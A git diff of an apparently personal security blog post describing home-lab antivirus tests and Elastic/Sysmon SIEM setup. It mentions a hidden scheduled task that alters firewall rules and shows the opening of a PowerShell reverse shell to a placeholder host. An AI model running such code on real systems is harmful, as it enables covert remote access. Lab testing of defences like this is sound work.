@@ -44,12 +44,12 @@
 使用电脑防护程序，360，腾讯电脑管家。现代杀毒软件通常都会配备基于特征，代码，行为的检测。这类杀毒软件可以应对大部分已经发生过的攻击，不过嘛，代价是什么。现代杀毒软件通常都会有基于特征，分析代码的扫盘，实时监控软件行为，然后附带一堆功能。剩下的功能好不好用就见仁见智了，什么上网防护，代理，固化...
 
 ## 基于特征  
-生成文件的哈希值，或者签名，去和存储在库里的已知恶意软件进行比较。平时扫盘用的就是这个。主播主播，没遇到过这题怎么办，那就给了。  
+生成文件的哈希值，或者签名，去和存储在库里的已知恶意软件进行比较。平时扫盘用的就是这个。主播主播，没遇到过这个病毒怎么办，那就给了。  
 
 ## 代码扫描  
 根据代码扫描来防御，和基于特征差不多，都是静态  
 
-这里下载了好几个杀毒软件来玩，俗称养蛊。腾讯管家希望下载个游戏中心被360挡了，360想改点什么被管家挡了，avast和AVG和无能的丈夫一样，啥都不干。下面是一个Wscript.exe的定时任务，每隔一段时间会启动powershell并且执行修改防火墙的指令。（不直接使用powershell定时是因为用了hidden还是会闪一下窗口出来）
+这里下载了好几个杀毒软件来玩，俗称养蛊。腾讯管家希望下载个游戏中心被360挡了，360想改点什么被管家挡了，avast和AVG和无能的丈夫一样，啥都不干。下面是一个Wscript.exe的定时任务，每隔一段时间会启动powershell并且执行修改防火墙的指令。（不直接使用powershell定时是因为用了hidden还是会闪一下窗口出来）第一个是wscript，第二个是powershell
 ```
 Set WshShell = CreateObject("WScript.Shell")
 
@@ -134,3 +134,93 @@ $LHOST = "<另一台机>"; $LPORT = <喜欢的端口>; $TCPClient = New-Object N
 这个子程序就被杀了，应该是因为windows执行的文件在隔离区，由reverse.ps1开启的C2还能存活。
 
 在一个正常环境中，我们可以使用杀毒软件来做基础的保护，辅助我们隔离一些可以软件。但是，做的小实验里，好几个杀毒程序都不会警告这些是恶意程序或者恶意行为。选择时可以对比一下网上风评或者自己动手实验一下，想想是不是一点风险都不希望有。个人感觉不是企业环境，有个能提示你当前访问的网站可疑就行了，在不会看网址的情况下，这应该可疑避免大部分恶意软件了。刷视频好像大多数都是访问了些非官网，才下载到恶意软件的。  
+# **SIEM**  
+Here I use the elastic as the example, the reason is I like the visualization process tree in it.(I am using the windows, linux and mac have to use other way)
+
+Donwload the kibana and elastic search zip files, extract it.  
+In elastic/bin, enter command below to set password  
+```
+.\elasticsearch-reset-password.bat -u kibana_system -i
+```
+Config the kibana-version/config/kibana.yml, add
+```
+server.port: 5601
+server.host: "localhost"
+
+elasticsearch.username: "kibana_system"
+elasticsearch.password: "password set"
+
+elasticsearch.hosts: ["https://localhost:9200"]
+elasticsearch.ssl.certificateAuthorities: ["path to elastic/elasticsearch-9.5.2/config/certs/http_ca.crt"]
+```
+Then execute the kibana-version/bin/kibana.bat and elasticsearch-version/bin/elasticsearch.bat. Wait for a moment and then access the localhost:5601.  
+Add the windows integration and follow the step to extract the file.  
+Download the sysmon.  
+Open cmd or powershell as administrator, configure the locate to the elastic agent, configure the elastic-agent.yml
+```
+outputs:
+  default:
+    type: elasticsearch
+    hosts:
+      - "https://127.0.0.1:9200"
+    username: "<username>"
+    password: "<password>"
+    preset: balanced
+    ssl:
+      certificate_authorities:
+        - '<path to certificate> like D:\elasticsearch-9.5.2-windows-x86_64\elasticsearch-9.5.2\config\certs\http_ca.crt'
+
+inputs:
+  - type: winlog
+    id: windows-security
+    use_output: default
+    streams:
+      - name: Security
+        data_stream:
+          type: logs
+          dataset: windows.security
+          namespace: default
+        winlog:
+          channel: Security
+
+  - type: winlog
+    id: windows-system
+    use_output: default
+    streams:
+      - name: System
+        data_stream:
+          type: logs
+          dataset: windows.system
+          namespace: default
+        winlog:
+          channel: System
+
+  - type: winlog
+    id: windows-application
+    use_output: default
+    streams:
+      - name: Application
+        data_stream:
+          type: logs
+          dataset: windows.application
+          namespace: default
+        winlog:
+          channel: Application
+
+  - type: winlog
+    id: windows-sysmon
+    use_output: default
+    streams:
+      - name: Microsoft-Windows-Sysmon/Operational
+        data_stream:
+          type: logs
+          dataset: windows.sysmon_operational
+          namespace: default
+        winlog:
+          channel: Microsoft-Windows-Sysmon/Operational
+```
+Use command to Restart the agent
+```
+Restart-Service "Elastic Agent"
+```
+Now, the search should display the events.
